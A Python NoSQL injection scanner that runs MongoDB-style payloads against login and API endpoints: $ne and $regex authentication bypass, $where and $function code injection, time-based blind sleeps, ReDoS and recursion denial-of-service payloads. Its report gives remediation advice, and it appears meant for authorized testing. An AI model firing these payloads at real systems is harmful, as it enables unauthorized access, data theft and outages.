#!/usr/bin/env python3
"""
Advanced NoSQL Injection Testing Suite
Comprehensive testing for MongoDB, PostgreSQL, and other NoSQL databases
"""

import asyncio
import aiohttp
import json
import re
import base64
import hashlib
import time
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional, Tuple, Union
from dataclasses import dataclass
from enum import Enum
import pymongo
from motor.motor_asyncio import AsyncIOMotorClient
import asyncpg

class InjectionType(Enum):
    OPERATOR_INJECTION = "operator_injection"
    JAVASCRIPT_INJECTION = "javascript_injection"
    ARRAY_INJECTION = "array_injection"
    BLIND_INJECTION = "blind_injection"
    AUTHENTICATION_BYPASS = "auth_bypass"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    DATA_EXFILTRATION = "data_exfiltration"
    DENIAL_OF_SERVICE = "denial_of_service"

@dataclass
class InjectionPayload:
    name: str
    payload: Union[Dict, List, str]
    injection_type: InjectionType
    description: str
    expected_result: str
    severity: str
    cwe_id: Optional[str] = None

class NoSQLInjectionTester:
    def __init__(self, target_url: str, auth_headers: Optional[Dict] = None):
        self.target_url = target_url
        self.auth_headers = auth_headers or {}
        self.session = None
        self.vulnerabilities = []
        self.payloads = self.generate_payloads()
        self.logger = self.setup_logging()

    def setup_logging(self):
        """Setup logging for injection testing"""
        import logging
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )
        return logging.getLogger('NoSQLInjectionTester')

    def generate_payloads(self) -> List[InjectionPayload]:
        """Generate comprehensive NoSQL injection payloads"""
        payloads = []

        # === Operator Injection Payloads ===
        payloads.extend([
            InjectionPayload(
                name="Basic $ne operator",
                payload={"username": {"$ne": None}, "password": {"$ne": None}},
                injection_type=InjectionType.OPERATOR_INJECTION,
                description="Bypass authentication using $ne operator",
                expected_result="Authentication bypass",
                severity="CRITICAL",
                cwe_id="CWE-943"
            ),
            InjectionPayload(
                name="Basic $gt operator",
                payload={"id": {"$gt": 0}},
                injection_type=InjectionType.OPERATOR_INJECTION,
                description="Extract data using $gt operator",
                expected_result="Data extraction",
                severity="HIGH"
            ),
            InjectionPayload(
                name="Regex injection",
                payload={"username": {"$regex": "^admin"}},
                injection_type=InjectionType.OPERATOR_INJECTION,
                description="Extract users using regex pattern",
                expected_result="User enumeration",
                severity="HIGH"
            ),
            InjectionPayload(
                name="Combined operators",
                payload={"$or": [{"username": "admin"}, {"password": {"$ne": None}}]},
                injection_type=InjectionType.OPERATOR_INJECTION,
                description="Complex query injection using $or",
                expected_result="Data extraction",
                severity="HIGH"
            ),
            InjectionPayload(
                name="Array-based injection",
                payload={"username": ["admin", "user"], "password": {"$ne": None}},
                injection_type=InjectionType.ARRAY_INJECTION,
                description="Array injection to bypass validation",
                expected_result="Authentication bypass",
                severity="CRITICAL"
            ),
            InjectionPayload(
                name="$nin operator injection",
                payload={"status": {"$nin": ["disabled", "suspended"]}},
                injection_type=InjectionType.OPERATOR_INJECTION,
                description="Filter using $nin operator",
                expected_result="Data filtering bypass",
                severity="MEDIUM"
            ),
            InjectionPayload(
                name="$in operator injection",
                payload={"role": {"$in": ["admin", "root", "superuser"]}},
                injection_type=InjectionType.OPERATOR_INJECTION,
                description="Privilege escalation attempt using $in",
                expected_result="Privilege escalation",
                severity="HIGH"
            ),
            InjectionPayload(
                name="$exists operator injection",
                payload={"password": {"$exists": True}},
                injection_type=InjectionType.OPERATOR_INJECTION,
                description="Check field existence",
                expected_result="Field enumeration",
                severity="MEDIUM"
            ),
            InjectionPayload(
                name="$type operator injection",
                payload={"password": {"$type": "string"}},
                injection_type=InjectionType.OPERATOR_INJECTION,
                description="Filter by field type",
                expected_result="Field type enumeration",
                severity="MEDIUM"
            )
        ])

        # === JavaScript Injection Payloads ===
        payloads.extend([
            InjectionPayload(
                name="$where JavaScript injection",
                payload={"$where": "return this.password == this.password"},
                injection_type=InjectionType.JAVASCRIPT_INJECTION,
                description="JavaScript injection in $where",
                expected_result="Authentication bypass",
                severity="CRITICAL",
                cwe_id="CWE-94"
            ),
            InjectionPayload(
                name="Function injection",
                payload={"$where": "function() { return true; }"},
                injection_type=InjectionType.JAVASCRIPT_INJECTION,
                description="Function injection for bypass",
                expected_result="Authentication bypass",
                severity="CRITICAL"
            ),
            InjectionPayload(
                name="JavaScript comparison",
                payload={"$where": "this.username == 'admin' || 'a' == 'a'"},
                injection_type=InjectionType.JAVASCRIPT_INJECTION,
                description="JavaScript logic injection",
                expected_result="Authentication bypass",
                severity="CRITICAL"
            ),
            InjectionPayload(
                name="Math operation injection",
                payload={"$where": "Math.random() > 0.5"},
                injection_type=InjectionType.JAVASCRIPT_INJECTION,
                description="Random function injection",
                expected_result="Probabilistic bypass",
                severity="HIGH"
            ),
            InjectionPayload(
                name="Date injection",
                payload={"$where": "new Date().getTime() > 0"},
                injection_type=InjectionType.JAVASCRIPT_INJECTION,
                description="Date object injection",
                expected_result="Authentication bypass",
                severity="HIGH"
            )
        ])

        # === Advanced Injection Payloads ===
        payloads.extend([
            InjectionPayload(
                name="$expr injection",
                payload={"$expr": {"$eq": ["$password", "$password"]}},
                injection_type=InjectionType.OPERATOR_INJECTION,
                description="Expression-based injection",
                expected_result="Authentication bypass",
                severity="CRITICAL"
            ),
            InjectionPayload(
                name="$jsonSchema injection",
                payload={"$jsonSchema": {"required": []}},
                injection_type=InjectionType.OPERATOR_INJECTION,
                description="Schema bypass injection",
                expected_result="Validation bypass",
                severity="HIGH"
            ),
            InjectionPayload(
                name="$comment injection",
                payload={"$comment": "injection test", "username": "admin"},
                injection_type=InjectionType.OPERATOR_INJECTION,
                description="Comment-based injection",
                expected_result="Query manipulation",
                severity="MEDIUM"
            ),
            InjectionPayload(
                name="$text injection",
                payload={"$text": {"$search": ""}},
                injection_type=InjectionType.OPERATOR_INJECTION,
                description="Text search injection",
                expected_result="Data extraction",
                severity="MEDIUM"
            ),
            InjectionPayload(
                name="$lookup injection",
                payload={"$lookup": {"from": "users", "as": "users"}},
                injection_type=InjectionType.DATA_EXFILTRATION,
                description="Aggregation pipeline injection",
                expected_result="Data collection",
                severity="HIGH"
            ),
            InjectionPayload(
                name="$function injection",
                payload={"$function": {"body": "function() { return 'injected'; }", "args": []}},
                injection_type=InjectionType.JAVASCRIPT_INJECTION,
                description="Server-side function injection",
                expected_result="Code execution",
                severity="CRITICAL",
                cwe_id="CWE-917"
            )
        ])

        # === Blind Injection Payloads ===
        payloads.extend([
            InjectionPayload(
                name="Time-based blind injection",
                payload={"$where": "sleep(5000)"},
                injection_type=InjectionType.BLIND_INJECTION,
                description="Time-based blind injection",
                expected_result="Response delay",
                severity="HIGH"
            ),
            InjectionPayload(
                name="Conditional blind injection",
                payload={"$where": "if(this.username == 'admin') sleep(5000) else 0"},
                injection_type=InjectionType.BLIND_INJECTION,
                description="Conditional time-based injection",
                expected_result="Conditional delay",
                severity="HIGH"
            ),
            InjectionPayload(
                name="Error-based injection",
                payload={"$regex": "{{invalid_regex}}"},
                injection_type=InjectionType.BLIND_INJECTION,
                description="Error-based injection",
                expected_result="Error message",
                severity="MEDIUM"
            )
        ])

        # === Denial of Service Payloads ===
        payloads.extend([
            InjectionPayload(
                name="Regex DoS",
                payload={"$regex": "^(a+)+b$"},
                injection_type=InjectionType.DENIAL_OF_SERVICE,
                description="ReDoS injection",
                expected_result="Performance degradation",
                severity="HIGH",
                cwe_id="CWE-400"
            ),
            InjectionPayload(
                name="Large array injection",
                payload={"$in": list(range(100000))},
                injection_type=InjectionType.DENIAL_OF_SERVICE,
                description="Memory exhaustion",
                expected_result="Memory exhaustion",
                severity="HIGH"
            ),
            InjectionPayload(
                name="Deep recursion injection",
                payload={"$where": "function recurse() { recurse(); } recurse()"},
                injection_type=InjectionType.DENIAL_OF_SERVICE,
                description="Stack overflow",
                expected_result="Server crash",
                severity="CRITICAL"
            )
        ])

        return payloads

    async def test_authentication_bypass(self):
        """Test authentication endpoints for NoSQL injection bypasses"""
        self.logger.info("🔍 Testing authentication bypass...")

        auth_endpoints = [
            "/api/v1/auth/login",
            "/api/v1/users/login",
            "/login",
            "/auth",
            "/api/authenticate"
        ]

        auth_payloads = [
            {"username": {"$ne": None}, "password": {"$ne": None}},
            {"username": "admin", "password": {"$ne": None}},
            {"username": {"$regex": "^admin"}, "password": {"$ne": None}},
            {"username": {"$in": ["admin", "root", "user"]}, "password": {"$ne": None}},
            {"username": ["admin"], "password": ["password"]},
            {"$where": "return true"},
            {"username": "admin'$or", "password": "'1'='1'"},
        ]

        async with aiohttp.ClientSession(headers=self.auth_headers) as session:
            for endpoint in auth_endpoints:
                url = f"{self.target_url}{endpoint}"

                for payload in auth_payloads:
                    try:
                        start_time = time.time()
                        async with session.post(url, json=payload, timeout=aiohttp.ClientTimeout(total=10)) as response:
                            end_time = time.time()
                            response_time = end_time - start_time

                            # Check for successful authentication indicators
                            if response.status == 200:
                                data = await response.json()

                                # Check for tokens or success messages
                                if (any(key in data for key in ['token', 'access_token', 'jwt', 'success']) or
                                    response_time > 5):  # Time-based blind injection

                                    self.vulnerabilities.append({
                                        "type": "Authentication Bypass",
                                        "endpoint": endpoint,
                                        "payload": payload,
                                        "status": response.status,
                                        "response_time": response_time,
                                        "severity": "CRITICAL",
                                        "description": f"NoSQL injection bypassed authentication at {endpoint}"
                                    })

                                    self.logger.critical(
                                        f"🚨 AUTHENTICATION BYPASS: {endpoint} - Payload: {payload}"
                                    )

                    except asyncio.TimeoutError:
                        # Timeout might indicate successful time-based injection
                        self.vulnerabilities.append({
                            "type": "Time-based Injection",
                            "endpoint": endpoint,
                            "payload": payload,
                            "status": "TIMEOUT",
                            "response_time": ">10s",
                            "severity": "HIGH",
                            "description": f"Potential time-based injection at {endpoint}"
                        })

                        self.logger.warning(
                            f"⏰ TIME-BASED INJECTION: {endpoint} - Payload: {payload}"
                        )

                    except Exception as e:
                        continue

    async def test_api_endpoints(self):
        """Test API endpoints for NoSQL injection"""
        self.logger.info("🔍 Testing API endpoints...")

        endpoints = [
            {"method": "GET", "path": "/api/v1/users", "params": ["filter", "search", "query"]},
            {"method": "GET", "path": "/api/v1/assessments", "params": ["filter", "sort", "fields"]},
            {"method": "GET", "path": "/api/v1/responses", "params": ["user_id", "assessment_id"]},
            {"method": "POST", "path": "/api/v1/users", "body_fields": ["filter", "query", "search"]},
            {"method": "PUT", "path": "/api/v1/users/{id}", "body_fields": ["filter", "query"]},
            {"method": "GET", "path": "/api/v1/analytics", "params": ["filter", "group_by"]},
        ]

        async with aiohttp.ClientSession(headers=self.auth_headers) as session:
            for endpoint in endpoints:
                await self.test_endpoint(session, endpoint)

    async def test_endpoint(self, session: aiohttp.ClientSession, endpoint: Dict):
        """Test a single endpoint for NoSQL injection"""
        method = endpoint["method"]
        path = endpoint["path"]

        # Test operator injection payloads
        critical_payloads = [
            {"$ne": None},
            {"$gt": ""},
            {"$regex": ".*"},
            {"$where": "return true"},
            {"$or": [{"1": "1"}]},
        ]

        for payload in critical_payloads:
            try:
                if method == "GET":
                    await self.test_get_endpoint(session, path, payload, endpoint.get("params", []))
                elif method == "POST":
                    await self.test_post_endpoint(session, path, payload, endpoint.get("body_fields", []))
                elif method == "PUT":
                    await self.test_put_endpoint(session, path, payload, endpoint.get("body_fields", []))

            except Exception as e:
                self.logger.debug(f"Error testing {method} {path}: {str(e)}")

    async def test_get_endpoint(self, session: aiohttp.ClientSession, path: str, payload: Dict, params: List[str]):
        """Test GET endpoint for injection"""
        for param in params:
            try:
                # Test injection in parameter
                test_url = f"{self.target_url}{path}"
                params_dict = {param: json.dumps(payload)}

                start_time = time.time()
                async with session.get(test_url, params=params_dict, timeout=aiohttp.ClientTimeout(total=10)) as response:
                    end_time = time.time()
                    await self.analyze_response(response, payload, "GET", path, param, end_time - start_time)

            except asyncio.TimeoutError:
                self.vulnerabilities.append({
                    "type": "Time-based Injection",
                    "method": "GET",
                    "endpoint": path,
                    "parameter": param,
                    "payload": payload,
                    "severity": "HIGH",
                    "description": f"Timeout indicates potential time-based injection"
                })

    async def test_post_endpoint(self, session: aiohttp.ClientSession, path: str, payload: Dict, body_fields: List[str]):
        """Test POST endpoint for injection"""
        for field in body_fields:
            try:
                test_data = {field: payload}
                test_url = f"{self.target_url}{path}"

                start_time = time.time()
                async with session.post(test_url, json=test_data, timeout=aiohttp.ClientTimeout(total=10)) as response:
                    end_time = time.time()
                    await self.analyze_response(response, payload, "POST", path, field, end_time - start_time)

            except asyncio.TimeoutError:
                self.vulnerabilities.append({
                    "type": "Time-based Injection",
                    "method": "POST",
                    "endpoint": path,
                    "field": field,
                    "payload": payload,
                    "severity": "HIGH",
                    "description": f"Timeout indicates potential time-based injection"
                })

    async def test_put_endpoint(self, session: aiohttp.ClientSession, path: str, payload: Dict, body_fields: List[str]):
        """Test PUT endpoint for injection"""
        for field in body_fields:
            try:
                test_data = {field: payload}
                test_url = f"{self.target_url}{path}/test_id"

                start_time = time.time()
                async with session.put(test_url, json=test_data, timeout=aiohttp.ClientTimeout(total=10)) as response:
                    end_time = time.time()
                    await self.analyze_response(response, payload, "PUT", path, field, end_time - start_time)

            except asyncio.TimeoutError:
                self.vulnerabilities.append({
                    "type": "Time-based Injection",
                    "method": "PUT",
                    "endpoint": path,
                    "field": field,
                    "payload": payload,
                    "severity": "HIGH",
                    "description": f"Timeout indicates potential time-based injection"
                })

    async def analyze_response(self, response: aiohttp.ClientResponse, payload: Dict, method: str,
                              endpoint: str, param: str, response_time: float):
        """Analyze HTTP response for injection indicators"""
        try:
            data = await response.json()
        except:
            data = await response.text()

        # Check for injection success indicators
        success_indicators = [
            response.status == 200,
            response_time > 5,  # Time-based injection
            isinstance(data, dict) and len(data) > 100,  # Large data return
            isinstance(data, str) and "error" in data.lower() and "injection" not in data.lower(),
        ]

        if any(success_indicators):
            severity = "CRITICAL" if response.status == 200 else "HIGH"

            self.vulnerabilities.append({
                "type": "NoSQL Injection",
                "method": method,
                "endpoint": endpoint,
                "parameter": param,
                "payload": payload,
                "status": response.status,
                "response_time": response_time,
                "severity": severity,
                "description": f"NoSQL injection vulnerability in {method} {endpoint}"
            })

            self.logger.critical(
                f"🚨 NOSQL INJECTION: {method} {endpoint} - {param} - Payload: {payload}"
            )

    async def test_direct_database_injection(self, connection_string: str):
        """Test direct database connection for injection vulnerabilities"""
        self.logger.info("🔍 Testing direct database injection...")

        try:
            # Test MongoDB injection
            if "mongodb" in connection_string:
                await self.test_mongodb_injection(connection_string)

        except Exception as e:
            self.logger.error(f"Error testing direct database injection: {str(e)}")

    async def test_mongodb_injection(self, connection_string: str):
        """Test MongoDB for injection vulnerabilities"""
        try:
            client = AsyncIOMotorClient(connection_string, serverSelectionTimeoutMS=5000)
            db = client.testdb
            collection = db.testcollection

            # Test for admin database access without auth
            try:
                await client.admin.command('listCollections')
                self.vulnerabilities.append({
                    "type": "Authentication Bypass",
                    "database": "MongoDB",
                    "severity": "CRITICAL",
                    "description": "MongoDB admin database accessible without authentication"
                })
            except:
                pass  # This is expected - authentication should be required

            # Test for dangerous query operations
            dangerous_queries = [
                {"$where": "return true"},
                {"$regex": ".*"},
                {"$ne": None},
                {"$expr": {"$eq": ["$password", "$password"]}}
            ]

            for query in dangerous_queries:
                try:
                    result = await collection.find(query).to_list(length=10)
                    if len(result) > 0:
                        self.vulnerabilities.append({
                            "type": "Query Injection",
                            "database": "MongoDB",
                            "payload": query,
                            "results_count": len(result),
                            "severity": "CRITICAL",
                            "description": f"Dangerous query returned {len(result)} results"
                        })
                except:
                    pass

            client.close()

        except Exception as e:
            self.logger.debug(f"MongoDB injection test error: {str(e)}")

    async def test_blind_injection(self):
        """Test for blind NoSQL injection"""
        self.logger.info("🔍 Testing blind NoSQL injection...")

        blind_payloads = [
            {"$where": "sleep(1000)"},  # 1 second delay
            {"$where": "if(this.username == 'admin') sleep(2000) else 0"},
            {"$where": "for(let i=0;i<100000;i++){Math.random()}"},
            {"$regex": "{{invalid}}"},
        ]

        async with aiohttp.ClientSession(headers=self.auth_headers) as session:
            for payload in blind_payloads:
                start_time = time.time()
                try:
                    async with session.post(
                        f"{self.target_url}/api/v1/auth/login",
                        json=payload,
                        timeout=aiohttp.ClientTimeout(total=5)
                    ) as response:
                        end_time = time.time()
                        response_time = end_time - start_time

                        if response_time > 4:  # Significant delay
                            self.vulnerabilities.append({
                                "type": "Blind NoSQL Injection",
                                "payload": payload,
                                "response_time": response_time,
                                "severity": "HIGH",
                                "description": f"Time-based blind injection detected with {response_time:.2f}s delay"
                            })

                except asyncio.TimeoutError:
                    self.vulnerabilities.append({
                        "type": "Blind NoSQL Injection",
                        "payload": payload,
                        "response_time": "TIMEOUT",
                        "severity": "HIGH",
                        "description": "Timeout indicates successful blind injection"
                    })
                except Exception:
                    pass

    async def generate_report(self) -> Dict[str, Any]:
        """Generate comprehensive injection testing report"""
        report = {
            "scan_date": datetime.utcnow().isoformat(),
            "target_url": self.target_url,
            "total_vulnerabilities": len(self.vulnerabilities),
            "vulnerabilities": self.vulnerabilities,
            "summary": {},
            "recommendations": []
        }

        # Categorize vulnerabilities
        severity_count = {
            "CRITICAL": 0,
            "HIGH": 0,
            "MEDIUM": 0,
            "LOW": 0
        }

        injection_types = {}

        for vuln in self.vulnerabilities:
            severity = vuln.get("severity", "MEDIUM")
            severity_count[severity] = severity_count.get(severity, 0) + 1

            vuln_type = vuln.get("type", "Unknown")
            injection_types[vuln_type] = injection_types.get(vuln_type, 0) + 1

        report["summary"] = {
            "by_severity": severity_count,
            "by_type": injection_types,
            "most_critical": severity_count["CRITICAL"] + severity_count["HIGH"]
        }

        # Generate recommendations
        if severity_count["CRITICAL"] > 0:
            report["recommendations"].append({
                "priority": "IMMEDIATE",
                "issue": "Critical NoSQL injection vulnerabilities found",
                "action": "Patch all critical vulnerabilities immediately"
            })

        if severity_count["HIGH"] > 0:
            report["recommendations"].append({
                "priority": "URGENT",
                "issue": "High-risk injection vulnerabilities",
                "action": "Address high-risk vulnerabilities within 48 hours"
            })

        report["recommendations"].extend([
            {
                "priority": "PREVENTIVE",
                "issue": "Input validation needed",
                "action": "Implement strict input validation and parameterized queries"
            },
            {
                "priority": "PREVENTIVE",
                "issue": "Authentication bypass possible",
                "action": "Use secure authentication mechanisms and avoid raw database queries in auth"
            },
            {
                "priority": "PREVENTIVE",
                "issue": "JavaScript execution in database",
                "action": "Disable JavaScript execution in database queries"
            }
        ])

        return report

    async def run_all_tests(self, connection_string: Optional[str] = None):
        """Run all NoSQL injection tests"""
        self.logger.info("🚀 Starting comprehensive NoSQL injection testing...")

        # Test authentication bypass (highest priority)
        await self.test_authentication_bypass()

        # Test API endpoints
        await self.test_api_endpoints()

        # Test blind injection
        await self.test_blind_injection()

        # Test direct database connection if provided
        if connection_string:
            await self.test_direct_database_injection(connection_string)

        # Generate and return report
        return await self.generate_report()

async def main():
    """Main execution function"""
    target_url = "http://localhost:8000"
    auth_headers = {
        "Content-Type": "application/json",
        # Add authentication headers if needed
        # "Authorization": "Bearer <token>"
    }

    tester = NoSQLInjectionTester(target_url, auth_headers)

    try:
        report = await tester.run_all_tests()

        print(f"\n🔍 NoSQL Injection Test Complete")
        print(f"📊 Total Vulnerabilities: {report['total_vulnerabilities']}")
        print(f"🚨 Critical: {report['summary']['by_severity'].get('CRITICAL', 0)}")
        print(f"⚠️  High: {report['summary']['by_severity'].get('HIGH', 0)}")
        print(f"⚡ Medium: {report['summary']['by_severity'].get('MEDIUM', 0)}")
        print(f"ℹ️  Low: {report['summary']['by_severity'].get('LOW', 0)}")

        # Save detailed report
        report_file = f"nosql_injection_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2, default=str)

        print(f"\n📄 Detailed report saved to: {report_file}")

        # Print critical findings
        critical_vulns = [v for v in tester.vulnerabilities if v.get('severity') == 'CRITICAL']
        if critical_vulns:
            print(f"\n🚨 CRITICAL VULNERABILITIES:")
            for vuln in critical_vulns[:5]:  # Show first 5
                print(f"• {vuln.get('type', 'Unknown')}: {vuln.get('description', 'No description')}")

    except Exception as e:
        print(f"❌ Error during NoSQL injection testing: {str(e)}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    asyncio.run(main())